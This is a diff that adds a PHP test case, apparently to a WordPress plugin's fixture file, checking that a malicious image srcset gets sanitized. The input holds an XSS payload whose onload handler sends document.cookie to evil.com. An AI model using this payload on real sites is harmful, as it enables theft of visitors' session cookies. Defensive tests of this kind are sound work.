@@ -1370,5 +1370,63 @@ return [
 			],
 		],
 	],
+	/**
+	 * Test Case: XSS attempt via srcset with onload event handler
+	 * Should sanitize/reject malicious srcset containing onload
+	 */
+	'testXSSInSrcsetOnload' => [
+		'config' => [
+			'filter'  => true,
+			'url'     => 'http://example.org/test-page/',
+			'is_mobile' => false,
+			'results' => json_encode(
+				[
+					'lcp' => [
+						[
+							'type'    => 'picture',
+							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
+							'srcset'  => '',
+							'sizes'   => '',
+							'sources' => [
+								[
+									'srcset' => 'image.webp" onload="fetch(\'https://evil.com?c=\'+document.cookie)',
+									'media'  => '',
+									'type'   => 'image/webp',
+									'sizes'  => '',
+								],
+							],
+							'label'   => 'lcp',
+						],
+					],
+				]
+			),
+			'allowed_mime_types' => $mime_types,
+			'filetype' => [
+				'ext'  => 'webp',
+				'type' => 'image/webp',
+			],
+		],
+		'expected' => [
+			'result'  => true,
+			'message' => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'status' => 'completed',
+				'error_message' => '',
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"","media":"","type":"image\/webp","sizes":""}]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+			],
+			'item'    => [
+				'url' => 'http://example.org/test-page',
+				'is_mobile' => false,
+				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"","media":"","type":"image\/webp","sizes":""}]}',
+				'viewport' => '[]',
+				'last_accessed' => null,
+				'status' => 'completed',
+				'error_message' => '',
+			],
+		],
+	],
 
 ];
